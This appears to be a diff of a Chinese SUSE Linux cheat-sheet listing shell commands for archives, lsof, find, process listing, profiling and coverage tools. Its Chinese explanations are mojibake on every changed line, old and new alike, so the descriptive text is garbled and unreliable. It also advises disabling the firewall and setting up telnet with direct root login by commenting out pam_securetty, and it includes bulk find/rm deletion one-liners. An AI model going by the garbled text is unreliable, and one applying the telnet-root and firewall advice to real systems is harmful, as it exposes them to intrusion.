@@ -1,95 +1,95 @@
 suse
-suse±Ê¼Ç
+suseç¬”è®°
 
-topÄÚ´æÅÅĞò
-Ö´ĞĞtopÒÔºó£¬ÔÚ¿ØÖÆÌ¨Ö´ĞĞshift + M
+topå†…å­˜æ’åº
+æ‰§è¡Œtopä»¥åï¼Œåœ¨æ§åˆ¶å°æ‰§è¡Œshift + M
 
 
-½âÑ¹tar.gzÎÄ¼ş
+è§£å‹tar.gzæ–‡ä»¶
 tar xzvf aa.tar.gz
 
-Ñ¹Ëõtar.gzÎÄ¼ş
+å‹ç¼©tar.gzæ–‡ä»¶
 tar czvf aa.tar.gz *
 
-nmµÄ-o²ÎÊı¿ÉÒÔ°ÑÎÄ¼şÃûÏÔÊ¾³öÀ´
+nmçš„-oå‚æ•°å¯ä»¥æŠŠæ–‡ä»¶åæ˜¾ç¤ºå‡ºæ¥
 nm -o *|grep iMAP
 
-²é¿´»·¾³±äÁ¿
+æŸ¥çœ‹ç¯å¢ƒå˜é‡
 env
 
-²é¿´cpuĞÅÏ¢
+æŸ¥çœ‹cpuä¿¡æ¯
 cat /proc/cpuinfo
 
-²é¿´ÄÚ´æ×ÜÁ¿
+æŸ¥çœ‹å†…å­˜æ€»é‡
 grep MemTotal /proc/meminfo
 
-²é¿´¿ÕÏĞÄÚ´æÁ¿
+æŸ¥çœ‹ç©ºé—²å†…å­˜é‡
 grep MemFree /proc/meminfo 
 
-iptables -L # ²é¿´·À»ğÇ½ÉèÖÃ
+iptables -L # æŸ¥çœ‹é˜²ç«å¢™è®¾ç½®
 
-netstat -s # ²é¿´ÍøÂçÍ³¼ÆĞÅÏ¢
+netstat -s # æŸ¥çœ‹ç½‘ç»œç»Ÿè®¡ä¿¡æ¯
 
-netstat -antp # ²é¿´ËùÓĞÒÑ¾­½¨Á¢µÄÁ¬½Ó
+netstat -antp # æŸ¥çœ‹æ‰€æœ‰å·²ç»å»ºç«‹çš„è¿æ¥
 
-netstat -lntp # ²é¿´ËùÓĞ¼àÌı¶Ë¿Ú
+netstat -lntp # æŸ¥çœ‹æ‰€æœ‰ç›‘å¬ç«¯å£
 
-chkconfig --list # ÁĞ³öËùÓĞÏµÍ³·şÎñ
+chkconfig --list # åˆ—å‡ºæ‰€æœ‰ç³»ç»ŸæœåŠ¡
 
-rpm -qa # ²é¿´ËùÓĞ°²×°µÄÈí¼ş°ü
+rpm -qa # æŸ¥çœ‹æ‰€æœ‰å®‰è£…çš„è½¯ä»¶åŒ…
 
 pushd .
-½«µ±Ç°Ä¿Â¼Ñ¹ÈëÕ»£¬ÒÔºóÄã¿ÉÒÔÊ¹ÓÃpopd»Øµ½´ËÄ¿Â¼
+å°†å½“å‰ç›®å½•å‹å…¥æ ˆï¼Œä»¥åä½ å¯ä»¥ä½¿ç”¨popdå›åˆ°æ­¤ç›®å½•
 
 tar -c dir/ | bzip2 > dir.tar.bz2
-½«Ä¿Â¼dir/Ñ¹Ëõ´ò°ü
+å°†ç›®å½•dir/å‹ç¼©æ‰“åŒ…
 
 rsync --bwlimit=1000 fromfile tofile
-ÓĞËÙ¶ÈÏŞÖÆµÄ±¾µØ¿½±´£¬¶ÔI/OÓĞÀû
+æœ‰é€Ÿåº¦é™åˆ¶çš„æœ¬åœ°æ‹·è´ï¼Œå¯¹I/Oæœ‰åˆ©
 
 ethtool --change eth0 autoneg off speed 100 duplex full
-ÊÖ¶¯ÉèÖÆÍø¿¨ËÙ¶È
+æ‰‹åŠ¨è®¾åˆ¶ç½‘å¡é€Ÿåº¦
 
 
 ip route show
-ÏÔÊ¾Â·ÓÉÁĞ±í
+æ˜¾ç¤ºè·¯ç”±åˆ—è¡¨
 
 ip route add default via 1.2.3.254
-ÉèÖÃÄ¬ÈÏÍø¹Ø1.2.3.254
+è®¾ç½®é»˜è®¤ç½‘å…³1.2.3.254
 
 netstat -tup
-ÁĞ³ö»îÔ¾µÄÁ¬½Ó
+åˆ—å‡ºæ´»è·ƒçš„è¿æ¥
 
 ls -lSr
-°´ÎÄ¼ş´óĞ¡½µĞòÏÔÊ¾ÎÄ¼ş
+æŒ‰æ–‡ä»¶å¤§å°é™åºæ˜¾ç¤ºæ–‡ä»¶
 
 =====
-²é¿´Ä³¸ö¶Ë¿Ú±»ÄÄ¸ö½ø³ÌÕ¼ÓÃÁË
+æŸ¥çœ‹æŸä¸ªç«¯å£è¢«å“ªä¸ªè¿›ç¨‹å ç”¨äº†
 lsof -i :31007
 
-ÏÔÊ¾Ö¸¶¨Ä¿Â¼ÏÂµÄÎÄ¼ş±»ÄÄĞ©½ø³Ì´ò¿ªÁË
+æ˜¾ç¤ºæŒ‡å®šç›®å½•ä¸‹çš„æ–‡ä»¶è¢«å“ªäº›è¿›ç¨‹æ‰“å¼€äº†
 lsof +d /opt/iMAP/lib/
-lsof +D /opt/iMAP/lib/ --µİÍÆËÑË÷
+lsof +D /opt/iMAP/lib/ --é€’æ¨æœç´¢
 
-ÏÔÊ¾Ê¹ÓÃfdÎª4µÄ½ø³Ì
+æ˜¾ç¤ºä½¿ç”¨fdä¸º4çš„è¿›ç¨‹
 lsof -d 4
 
-¿´½ø³ÌºÅÎª12µÄ½ø³Ì´ò¿ªÁËÄÄĞ©ÎÄ¼ş 
+çœ‹è¿›ç¨‹å·ä¸º12çš„è¿›ç¨‹æ‰“å¼€äº†å“ªäº›æ–‡ä»¶ 
 lsof -p 12 
 
-¼ä¸ô1Ãë²é¿´½ø³ÌµÄ´ò¿ªµÄÎÄ¼ş
+é—´éš”1ç§’æŸ¥çœ‹è¿›ç¨‹çš„æ‰“å¼€çš„æ–‡ä»¶
 lsof +r 1 -c imapsysd
 
-ÁĞ³ö´ò¿ªÎÄ¼şµÄ´óĞ¡
+åˆ—å‡ºæ‰“å¼€æ–‡ä»¶çš„å¤§å°
 lsof -s -c imapsysd
 
--aÓë²Ù×÷µÄÓÃ·¨£¬ipv4¶øÇÒÊÇimapsysd
+-aä¸æ“ä½œçš„ç”¨æ³•ï¼Œipv4è€Œä¸”æ˜¯imapsysd
 lsof -i 4 -a -c imapsysd
 
-ÁĞ³ö´ò¿ªµÄËùÓĞÍøÂç¶Ë¿ÚĞÅÏ¢
+åˆ—å‡ºæ‰“å¼€çš„æ‰€æœ‰ç½‘ç»œç«¯å£ä¿¡æ¯
 lsof -i -U
 
-²é¿´¶à¸ö½ø³ÌµÄĞÅÏ¢
+æŸ¥çœ‹å¤šä¸ªè¿›ç¨‹çš„ä¿¡æ¯
 lsof -p 456,123,789 
 
 lsof -p $$
@@ -98,52 +98,52 @@ lsof -p 34654|grep 31050
 =====/
 
 ps -e -o pid,args --forest
-ÒÔÊ÷×´½á¹¹ÏÔÊ¾½ø³Ì
+ä»¥æ ‘çŠ¶ç»“æ„æ˜¾ç¤ºè¿›ç¨‹
 
 ps -e -o pcpu,cpu,nice,state,cputime,args --sort pcpu | sed '/^ 0.0 /d'
-ÒÔCPUÕ¼ÓÃÂÊÎªĞòÏÔÊ¾½ø³Ì
+ä»¥CPUå ç”¨ç‡ä¸ºåºæ˜¾ç¤ºè¿›ç¨‹
 
 ps -e -orss=,pid=,args= | sort -b -k1,1n | pr -TW$COLUMNS
-ÒÔÄÚ´æÊ¹ÓÃÁ¿ÎªĞòÏÔÊ¾½ø³Ì
+ä»¥å†…å­˜ä½¿ç”¨é‡ä¸ºåºæ˜¾ç¤ºè¿›ç¨‹
 
 touch -c -t 0304050607 file
-¸Ä±äÎÄ¼şµÄÊ±¼ä±êÇ© (YYMMDDhhmm)
+æ”¹å˜æ–‡ä»¶çš„æ—¶é—´æ ‡ç­¾ (YYMMDDhhmm)
 
 
 
 strace -e open ls
 
-linuxÉÏÍêÕûµÄerrno
+linuxä¸Šå®Œæ•´çš„errno
 cat /usr/include/asm-generic/errno.h
 
-²é¿´Ö§³ÖÄÄĞ©×Ö·û¼¯
+æŸ¥çœ‹æ”¯æŒå“ªäº›å­—ç¬¦é›†
 locale -a
 
-linuxÔ´´úÂë
+linuxæºä»£ç 
 /usr/src/linux-2.6.16.46-0.12
 
-suse¿ªÆôssh·şÎñ²½Öè
-yast2->ÓÃ»§¹ÜÀí->¿ªÆôssh·şÎñ
-¿ÉÄÜ»¹Òª¹Ø±Õ·À»ğÇ½
+suseå¼€å¯sshæœåŠ¡æ­¥éª¤
+yast2->ç”¨æˆ·ç®¡ç†->å¼€å¯sshæœåŠ¡
+å¯èƒ½è¿˜è¦å…³é—­é˜²ç«å¢™
 
-suseÒªÏëÊ¹ÓÃ¾²Ì¬ipÉÏÍø£¬»¹ÒªÉèÖÃÃüÃû·şÎñÆ÷ipºÍÂ·ÓÉip¶¼ÊÇ192.168.1.1
-»¹Òª°ÑÈğĞÇµÄ·À»ğÇ½±£»¤¹Øµô
+suseè¦æƒ³ä½¿ç”¨é™æ€ipä¸Šç½‘ï¼Œè¿˜è¦è®¾ç½®å‘½åæœåŠ¡å™¨ipå’Œè·¯ç”±ipéƒ½æ˜¯192.168.1.1
+è¿˜è¦æŠŠç‘æ˜Ÿçš„é˜²ç«å¢™ä¿æŠ¤å…³æ‰
 
-¿ªÆôsambaÔÚyast2ÖĞÑ¡ÔñÒªsmabaµÄÄ¿Â¼¼´¿É
+å¼€å¯sambaåœ¨yast2ä¸­é€‰æ‹©è¦smabaçš„ç›®å½•å³å¯
 
-objdump -d a.out --·´»ã±à
-objdump -x obj ÒÔÄ³ÖÖ·ÖÀàĞÅÏ¢µÄĞÎÊ½°ÑÄ¿±êÎÄ¼şµÄÊı¾İ×éÖ¯£¨±»·ÖÎª¼¸´ó¿é£©Êä³ö
-objdump -t obj Êä³öÄ¿±êÎÄ¼şµÄ·ûºÅ±í
+objdump -d a.out --åæ±‡ç¼–
+objdump -x obj ä»¥æŸç§åˆ†ç±»ä¿¡æ¯çš„å½¢å¼æŠŠç›®æ ‡æ–‡ä»¶çš„æ•°æ®ç»„ç»‡ï¼ˆè¢«åˆ†ä¸ºå‡ å¤§å—ï¼‰è¾“å‡º
+objdump -t obj è¾“å‡ºç›®æ ‡æ–‡ä»¶çš„ç¬¦å·è¡¨
 
 =====
-ÓÃgcovÀ´²âÊÔ´úÂë¸²¸ÇÂÊ 
-1¡¢±àÒëÁ´½ÓÔö¼Ó -fprofile-arcs -ftest-coverage
-2¡¢ÔËĞĞ
-3¡¢gcov main.c
-4¡¢²é¿´ÎÄ¼ş main.c.gcov
-(×¢Òâ£º³ÌĞò±ØĞëÕı³£ÍË³ö²Å¿ÉÒÔ£¬Èç¹ûÖĞÍ¾coredump»òÕßexitÊÇ²»ÄÜÉú³É±¨¸æµÄ)
+ç”¨gcovæ¥æµ‹è¯•ä»£ç è¦†ç›–ç‡ 
+1ã€ç¼–è¯‘é“¾æ¥å¢åŠ  -fprofile-arcs -ftest-coverage
+2ã€è¿è¡Œ
+3ã€gcov main.c
+4ã€æŸ¥çœ‹æ–‡ä»¶ main.c.gcov
+(æ³¨æ„ï¼šç¨‹åºå¿…é¡»æ­£å¸¸é€€å‡ºæ‰å¯ä»¥ï¼Œå¦‚æœä¸­é€”coredumpæˆ–è€…exitæ˜¯ä¸èƒ½ç”ŸæˆæŠ¥å‘Šçš„)
 
-Àı×Ó£º
+ä¾‹å­ï¼š
 cd /opt/gcf/test/gcov/src
 mwc
 mke
@@ -159,371 +159,371 @@ lcov -a ../temp/test_baseline.info -a ../temp/test_current.info -o ../temp/test.
 genhtml --legend -k -s -o ../report/ ../temp/test.info
 =====
 
-stat file²é¿´ÎÄ¼şµÄ×´Ì¬£¬°üÀ¨´´½¨Ê±¼ä
+stat fileæŸ¥çœ‹æ–‡ä»¶çš„çŠ¶æ€ï¼ŒåŒ…æ‹¬åˆ›å»ºæ—¶é—´
 
 
-md5sum »ñÈ¡ÎÄ¼şµÄmd5Öµ---md5¿ÉÒÔÀí½âÎªÎÄ¼şµÄÖ¸ÎÆ£¬ÊÇÎ¨Ò»µÄ
+md5sum è·å–æ–‡ä»¶çš„md5å€¼---md5å¯ä»¥ç†è§£ä¸ºæ–‡ä»¶çš„æŒ‡çº¹ï¼Œæ˜¯å”¯ä¸€çš„
 
 cut -d: -f1 /etc/passwd > /tmp/zieckey_usr.txt 
 
-¹ıfileÖ¸Áî£¬ÎÒÃÇµÃÒÔ±æÊ¶¸ÃÎÄ¼şµÄÀàĞÍ
+è¿‡fileæŒ‡ä»¤ï¼Œæˆ‘ä»¬å¾—ä»¥è¾¨è¯†è¯¥æ–‡ä»¶çš„ç±»å‹
 
 paste names places dates > npd
 
-splitÇĞ¸îÎÄ¼ş
+splitåˆ‡å‰²æ–‡ä»¶
 
-Ê¹ÓÃtouchÖ¸Áî¿É¸ü¸ÄÎÄ¼ş»òÄ¿Â¼µÄÈÕÆÚÊ±¼ä£¬°üÀ¨´æÈ¡Ê±¼äºÍ¸ü¸ÄÊ±¼ä
+ä½¿ç”¨touchæŒ‡ä»¤å¯æ›´æ”¹æ–‡ä»¶æˆ–ç›®å½•çš„æ—¥æœŸæ—¶é—´ï¼ŒåŒ…æ‹¬å­˜å–æ—¶é—´å’Œæ›´æ”¹æ—¶é—´
 
-uniq¿É¼ì²éÎÄ±¾ÎÄ¼şÖĞÖØ¸´³öÏÖµÄĞĞÁĞ£¬¿ÉÒÔ´òÓ¡ÖØ¸´µÄ´ÎÊı
+uniqå¯æ£€æŸ¥æ–‡æœ¬æ–‡ä»¶ä¸­é‡å¤å‡ºç°çš„è¡Œåˆ—ï¼Œå¯ä»¥æ‰“å°é‡å¤çš„æ¬¡æ•°
 
-netcat¹¦ÄÜºÜÇ¿´ó
+netcatåŠŸèƒ½å¾ˆå¼ºå¤§
 
-vlockËø¶¨ĞéÄâÖÕ¶Ë
+vlocké”å®šè™šæ‹Ÿç»ˆç«¯
 
-°Ñ¸ùÄ¿Â¼»»³ÉÖ¸¶¨µÄÄ¿µÄÄ¿Â¼
+æŠŠæ ¹ç›®å½•æ¢æˆæŒ‡å®šçš„ç›®çš„ç›®å½•
 
-vi´ò¿ªÎÄ¼şºó»á²úÉúÒ»¸öÁÙÊ±µÄÎÄ¼ş
-Èç/etc/.passwd.swp
+viæ‰“å¼€æ–‡ä»¶åä¼šäº§ç”Ÿä¸€ä¸ªä¸´æ—¶çš„æ–‡ä»¶
+å¦‚/etc/.passwd.swp
 
-¼ì²âcpuĞÍºÅ cat /proc/cpuinfo
+æ£€æµ‹cpuå‹å· cat /proc/cpuinfo
 
-gprof£¨linux£¬solaris£©¿É½øĞĞĞÔÄÜ·ÖÎö£¬·ÖÎöº¯Êıµ÷ÓÃ¹ØÏµ£¬±àÒëºÍÁ´½Ó¶¼Òª¼Ó-pg
-È»ºógprof a.out ×¢ÒâÕâ¸öÒªÏÈÖ´ĞĞ£¬£¬²ÅÄÜÖ´ĞĞÏÂÃæµÄ
+gprofï¼ˆlinuxï¼Œsolarisï¼‰å¯è¿›è¡Œæ€§èƒ½åˆ†æï¼Œåˆ†æå‡½æ•°è°ƒç”¨å…³ç³»ï¼Œç¼–è¯‘å’Œé“¾æ¥éƒ½è¦åŠ -pg
+ç„¶ågprof a.out æ³¨æ„è¿™ä¸ªè¦å…ˆæ‰§è¡Œï¼Œï¼Œæ‰èƒ½æ‰§è¡Œä¸‹é¢çš„
 gprof -b ./a.out ./gmon.out
-gprof -bC -f _Z5funcav ./a.out ./gmon.out Ö»¹Ø×¢funcaº¯Êı
-²ÎÊı-E Name ¼ÆËãÖĞÊ±¼äÅÅ³ıÁËName¼°Æä×Öº¯ÊıËùÓÃµÄÊ±¼ä
+gprof -bC -f _Z5funcav ./a.out ./gmon.out åªå…³æ³¨funcaå‡½æ•°
+å‚æ•°-E Name è®¡ç®—ä¸­æ—¶é—´æ’é™¤äº†NameåŠå…¶å­—å‡½æ•°æ‰€ç”¨çš„æ—¶é—´
 
-gprofÖ»ÄÜ²é¿´ÓÃ»§º¯Êı£¬
-Èç¹ûÏë²é¿´¿âº¯ÊıµÄĞÅÏ¢£¬ĞèÒªÔÚ±àÒëÊÇÔÙ¼ÓÈë¡°-lc_p¡±±àÒë²ÎÊı´úÌæ¡°-lc¡±±àÒë²ÎÊı
+gprofåªèƒ½æŸ¥çœ‹ç”¨æˆ·å‡½æ•°ï¼Œ
+å¦‚æœæƒ³æŸ¥çœ‹åº“å‡½æ•°çš„ä¿¡æ¯ï¼Œéœ€è¦åœ¨ç¼–è¯‘æ˜¯å†åŠ å…¥â€œ-lc_pâ€ç¼–è¯‘å‚æ•°ä»£æ›¿â€œ-lcâ€ç¼–è¯‘å‚æ•°
 
-Ï£ÍûfindÊ±ºöÂÔÄ³¸öÄ¿Â¼
+å¸Œæœ›findæ—¶å¿½ç•¥æŸä¸ªç›®å½•
 find /apps -name "/apps/bin" -prune -o -print
 
-Ö¸¶¨Ê±¼ä´´½¨ÎÄ¼ş(ÔÚfindÃüÁîµÄÊ±ºò¿ÉÒÔÓÃµ½)
+æŒ‡å®šæ—¶é—´åˆ›å»ºæ–‡ä»¶(åœ¨findå‘½ä»¤çš„æ—¶å€™å¯ä»¥ç”¨åˆ°)
 touch -t 08050102 dstamp
 find . -newer dstamp -print
 
-²éÕÒ³ıÄ¿Â¼ÒÔÎªµÄËùÓĞÀàĞÍµÄÎÄ¼ş
+æŸ¥æ‰¾é™¤ç›®å½•ä»¥ä¸ºçš„æ‰€æœ‰ç±»å‹çš„æ–‡ä»¶
 find . ! -type d -print
 
-²éÕÒÎÄ¼ş²¢É¾³ı
+æŸ¥æ‰¾æ–‡ä»¶å¹¶åˆ é™¤
 find logs -type f -mtime +5 -exec rm {} \;
 
-Ö´ĞĞÃüÁîÇ°ÓĞÌáÊ¾
+æ‰§è¡Œå‘½ä»¤å‰æœ‰æç¤º
 find ./ -name "*.o" -mtime +5 -ok rm{} \;
 
-²éÕÒ1ÌìÄÚĞŞ¸Ä¹ıµÄÎÄ¼ş
+æŸ¥æ‰¾1å¤©å†…ä¿®æ”¹è¿‡çš„æ–‡ä»¶
 find . -mtime -1
 
-²éÕÒ1ÌìÇ°ĞŞ¸Ä¹ıµÄÎÄ¼ş
+æŸ¥æ‰¾1å¤©å‰ä¿®æ”¹è¿‡çš„æ–‡ä»¶
 find . -mtime +1
 
-ÕÒ³ö¿ÕÄ¿Â¼
+æ‰¾å‡ºç©ºç›®å½•
 find /path -depth -type d -empty
 
-ÕÒ×Ö½ÚÎª0µÄÎÄ¼ş
+æ‰¾å­—èŠ‚ä¸º0çš„æ–‡ä»¶
 find /path -depth -type f -empty
 
-ÕÒ³ö²¢É¾³ıÎÄ¼ş
+æ‰¾å‡ºå¹¶åˆ é™¤æ–‡ä»¶
 find /path -name "core.*" -type f -print | xargs /bin/rm -f
 
-½«xml£¬confºó×ºÎÄ¼şÁĞ±í±£´æµÄÁ½¸ö¶ÀÁ¢ÎÄ¼şÖĞ
+å°†xmlï¼Œconfåç¼€æ–‡ä»¶åˆ—è¡¨ä¿å­˜çš„ä¸¤ä¸ªç‹¬ç«‹æ–‡ä»¶ä¸­
 find ./ -name "*.xml" -fprintf xmlfiles.txt "%p\n" , -name "*.conf" -fprintf cfg.txt "%p\n"
 
-½«Æ¥Åäµ½µÄÎÄ¼şÒÔls -lµÄĞÎÊ½ÏÔÊ¾³öÀ´ £¨-flsÊä³öµ½ÎÄ¼ş£©
+å°†åŒ¹é…åˆ°çš„æ–‡ä»¶ä»¥ls -lçš„å½¢å¼æ˜¾ç¤ºå‡ºæ¥ ï¼ˆ-flsè¾“å‡ºåˆ°æ–‡ä»¶ï¼‰
 find ./ -name "*.c" -ls
 
-Ö»ËÑË÷µÚ2²ãµÄÎÄ¼ş
+åªæœç´¢ç¬¬2å±‚çš„æ–‡ä»¶
 find ./ -maxdepth 2 -mindepth 2 -name "*.xml"
 
-²éÕÒ´óÓÚ10MµÄÎÄ¼ş
+æŸ¥æ‰¾å¤§äº10Mçš„æ–‡ä»¶
 find ./ -size +10M
 
 -amin n
-²éÕÒÏµÍ³ÖĞ×îºóN·ÖÖÓ·ÃÎÊµÄÎÄ¼ş
+æŸ¥æ‰¾ç³»ç»Ÿä¸­æœ€åNåˆ†é’Ÿè®¿é—®çš„æ–‡ä»¶
 
 -atime n
-²éÕÒÏµÍ³ÖĞ×îºón*24Ğ¡Ê±·ÃÎÊµÄÎÄ¼ş
+æŸ¥æ‰¾ç³»ç»Ÿä¸­æœ€ån*24å°æ—¶è®¿é—®çš„æ–‡ä»¶
 
 -cmin n
-²éÕÒÏµÍ³ÖĞ×îºóN·ÖÖÓ±»¸Ä±äÎÄ¼ş×´Ì¬µÄÎÄ¼ş
+æŸ¥æ‰¾ç³»ç»Ÿä¸­æœ€åNåˆ†é’Ÿè¢«æ”¹å˜æ–‡ä»¶çŠ¶æ€çš„æ–‡ä»¶
 
 -ctime n
-²éÕÒÏµÍ³ÖĞ×îºón*24Ğ¡Ê±±»¸Ä±äÎÄ¼ş×´Ì¬µÄÎÄ¼ş
+æŸ¥æ‰¾ç³»ç»Ÿä¸­æœ€ån*24å°æ—¶è¢«æ”¹å˜æ–‡ä»¶çŠ¶æ€çš„æ–‡ä»¶
 
 -mmin n
-²éÕÒÏµÍ³ÖĞ×îºóN·ÖÖÓ±»¸Ä±äÎÄ¼şÊı¾İµÄÎÄ¼ş
+æŸ¥æ‰¾ç³»ç»Ÿä¸­æœ€åNåˆ†é’Ÿè¢«æ”¹å˜æ–‡ä»¶æ•°æ®çš„æ–‡ä»¶
 
 -mtime n
-²éÕÒÏµÍ³ÖĞ×îºón*24Ğ¡Ê±±»¸Ä±äÎÄ¼şÊı¾İµÄÎÄ¼ş
+æŸ¥æ‰¾ç³»ç»Ÿä¸­æœ€ån*24å°æ—¶è¢«æ”¹å˜æ–‡ä»¶æ•°æ®çš„æ–‡ä»¶
 
-manµÄÊ±ºò¿ÉÒÔ°´P »Øµ½¿ªÊ¼
+mançš„æ—¶å€™å¯ä»¥æŒ‰P å›åˆ°å¼€å§‹
 
-LinuxÄÚºËÔ´´úÂëÖĞ¾ø´ó²¿·ÖÊÇÉè±¸Çı¶¯³ÌĞò
+Linuxå†…æ ¸æºä»£ç ä¸­ç»å¤§éƒ¨åˆ†æ˜¯è®¾å¤‡é©±åŠ¨ç¨‹åº
 
-¹Ø»úÃüÁî
+å…³æœºå‘½ä»¤
 shutdown -h 0
 
-ctrl + c²»ÄÜÍË³ö£¬¿ÉÒÔ³¢ÊÔctrl + z
+ctrl + cä¸èƒ½é€€å‡ºï¼Œå¯ä»¥å°è¯•ctrl + z
 
-shell¿ì½İ¼ü
-atl + f ÏòÇ°Ìø×ªµ½ÏÂÒ»¸ö×ÖµÄµÚÒ»¸ö×Ö·û
-atl + b ÏòºóÌø×ªµ½ÏÂÒ»¸ö×ÖµÄµÚÒ»¸ö×Ö·û
-atl + d É¾³ı´Ó¹â±êµ±Ç°Î»ÖÃ£¬µ½µ±Ç°×ÖµÄ½áÎ²×Ö·û
-ctrl + k ´Ó¹â±êµ±Ç°Î»ÖÃÉ¾³ıËùÓĞ×Ö·ûÖÁĞĞÎ²
-ctrl + w ÏòºóÉ¾³ıÒ»¸ö×Ö£¬ÓÃÀ´¶Ô¸¶¸Õ¸ÕÊäÈëµÄ´íÎó×ÖºÜÓĞÓÃ
-atl u µ¥´Ê±ä´óĞ´
-alt t ½»»»µ¥´Ê
+shellå¿«æ·é”®
+atl + f å‘å‰è·³è½¬åˆ°ä¸‹ä¸€ä¸ªå­—çš„ç¬¬ä¸€ä¸ªå­—ç¬¦
+atl + b å‘åè·³è½¬åˆ°ä¸‹ä¸€ä¸ªå­—çš„ç¬¬ä¸€ä¸ªå­—ç¬¦
+atl + d åˆ é™¤ä»å…‰æ ‡å½“å‰ä½ç½®ï¼Œåˆ°å½“å‰å­—çš„ç»“å°¾å­—ç¬¦
+ctrl + k ä»å…‰æ ‡å½“å‰ä½ç½®åˆ é™¤æ‰€æœ‰å­—ç¬¦è‡³è¡Œå°¾
+ctrl + w å‘ååˆ é™¤ä¸€ä¸ªå­—ï¼Œç”¨æ¥å¯¹ä»˜åˆšåˆšè¾“å…¥çš„é”™è¯¯å­—å¾ˆæœ‰ç”¨
+atl u å•è¯å˜å¤§å†™
+alt t äº¤æ¢å•è¯
 
-bind -P ²é¿´ËùÓĞµÄ¼üÅÌ°ó¶¨
+bind -P æŸ¥çœ‹æ‰€æœ‰çš„é”®ç›˜ç»‘å®š
 
 lsof
-²é¿´Ë­ÔÚÊ¹ÓÃÎÄ¼şÏµÍ³
+æŸ¥çœ‹è°åœ¨ä½¿ç”¨æ–‡ä»¶ç³»ç»Ÿ
 lsof /opt/gcf
 
-Èç¹û»¹ÓĞ½ø³ÌÊ¹ÓÃÎÄ¼ş£¬¼´Ê¹Õâ¸öÎÄ¼ş±»ÎóÉ¾ÁË£¬Ò²¿ÉÒÔ½«Æä»Ö¸´
+å¦‚æœè¿˜æœ‰è¿›ç¨‹ä½¿ç”¨æ–‡ä»¶ï¼Œå³ä½¿è¿™ä¸ªæ–‡ä»¶è¢«è¯¯åˆ äº†ï¼Œä¹Ÿå¯ä»¥å°†å…¶æ¢å¤
 # lsof |grep /var/log/messages
 syslogd 1283 root 2w REG 3,3 5381017 1773647 /var/log/messages (deleted)
 cat /proc/1283/fd/2 > /var/log/messages 
 
-lsof -i :21 ²é¿´21¶Ë¿ÚÏÖÔÚÔËĞĞÊ²Ã´³ÌĞò
+lsof -i :21 æŸ¥çœ‹21ç«¯å£ç°åœ¨è¿è¡Œä»€ä¹ˆç¨‹åº
 
-lsof +d /usr/local/ >ÏÔÊ¾Ä¿Â¼ÏÂ±»½ø³Ì¿ªÆôµÄÎÄ¼ş
+lsof +d /usr/local/ >æ˜¾ç¤ºç›®å½•ä¸‹è¢«è¿›ç¨‹å¼€å¯çš„æ–‡ä»¶
 
 
-lsof -c vi ÏÔÊ¾½ø³Ìvi´ò¿ªµÄÎÄ¼ş
+lsof -c vi æ˜¾ç¤ºè¿›ç¨‹viæ‰“å¼€çš„æ–‡ä»¶
 
-lsof -d 4 ÏÔÊ¾Ê¹ÓÃfdÎª4µÄ½ø³Ì
+lsof -d 4 æ˜¾ç¤ºä½¿ç”¨fdä¸º4çš„è¿›ç¨‹
 
-lsof -r 2 /opt/gcf Ã¿2ÃëÖ´ĞĞÒ»´Î
+lsof -r 2 /opt/gcf æ¯2ç§’æ‰§è¡Œä¸€æ¬¡
 
-lsof -p 12 ¿´½ø³ÌºÅÎª12µÄ½ø³Ì´ò¿ªÁËÄÄĞ©ÎÄ¼ş
+lsof -p 12 çœ‹è¿›ç¨‹å·ä¸º12çš„è¿›ç¨‹æ‰“å¼€äº†å“ªäº›æ–‡ä»¶
 
-strace³£ÓÃ£º
--s strsize --Ö¸¶¨Êä³ö×Ö·û´®×î´ó³¤¶È
+straceå¸¸ç”¨ï¼š
+-s strsize --æŒ‡å®šè¾“å‡ºå­—ç¬¦ä¸²æœ€å¤§é•¿åº¦
 
 ltrace
 ltrace -e fclose -l/lib/libc.so.6 ls
 
-°²×°telnet·şÎñ£º
+å®‰è£…telnetæœåŠ¡ï¼š
 yast2 inetd
-Ñ¡ÔñEnable £¬Ñ¡Ôñtelnet£¬Ñ¡ÔñEdit
-¿ªÆô·À»ğÇ½23¶Ë¿Ú
+é€‰æ‹©Enable ï¼Œé€‰æ‹©telnetï¼Œé€‰æ‹©Edit
+å¼€å¯é˜²ç«å¢™23ç«¯å£
 yast2 firewall
-Ñ¡ÔñAllowed Services
-Ñ¡ÔñRemote Access to Display Manager £¬Ñ¡ÔñAdvanced
-ÔÚTCP PortsÖĞÊäÈë23
-ÖØÆô»úÆ÷
+é€‰æ‹©Allowed Services
+é€‰æ‹©Remote Access to Display Manager ï¼Œé€‰æ‹©Advanced
+åœ¨TCP Portsä¸­è¾“å…¥23
+é‡å¯æœºå™¨
 
-¼ì²ételnetÊÇ·ñ°²×°
+æ£€æŸ¥telnetæ˜¯å¦å®‰è£…
 chkconfig -list|grep telnet
 
-telnet·şÎñ¶ÔÓ¦µÄ½ø³Ì
+telnetæœåŠ¡å¯¹åº”çš„è¿›ç¨‹
 /usr/sbin/xinetd
 
-telnetÊ¹root¿ÉÒÔÖ±½ÓµÇÂ¼£¬×¢ÊÍĞĞ
+telnetä½¿rootå¯ä»¥ç›´æ¥ç™»å½•ï¼Œæ³¨é‡Šè¡Œ
 cat /etc/pam.d/login
 #auth required pam_securetty.so
 
-nm -l a.out --ÁĞ³ö·ûºÅ¶ÔÓ¦µÄĞĞ
+nm -l a.out --åˆ—å‡ºç¬¦å·å¯¹åº”çš„è¡Œ
 
-tarÖ¸¶¨½âÑ¹Ä¿Â¼
+taræŒ‡å®šè§£å‹ç›®å½•
 tar xvfz file.tar.gz -C /tmp
 
-suse£º
-gunzip -dc gcf.tar.gz |tar -xv --Ò»²½½âÑ¹tar.gz¸ñÊ½
-tar xzvf gcf.tar.gz --»òÕßÕâ¸öÃüÁî
-tar -ztvf gcf.tar.gz --²é¿´tar.gzÓĞÊ²Ã´ÎÄ¼ş
-grep "abc" `tar tf gcf.tar` --ÔÚtar°üÖĞËÑË÷°üº¬abcµÄÎÄ¼ş
-grep "abc" `tar tzf gcf.tar.gz` ----ÔÚtar.gz°üÖĞËÑË÷°üº¬abcµÄÎÄ¼ş
-tar xvf gcf.tar gcf/aa.txt --Ö»½âÑ¹Ò»¸öÎÄ¼ş
-gunzip -dc gcf.tar.gz | tar xf - gcf/aa.txt --Ö»½âÑ¹Ò»¸öÎÄ¼ş
-tar -zxvpf /tmp/etc.tar.gz /etc -- pÑ¡Ïî±£ÁôÔ­ÎÄ¼şµÄÊôĞÔ
-tar zcvf gcf.tar.gz gcf --Ò»´ÎĞÔÑ¹Ëõ³Étar.gz¸ñÊ½
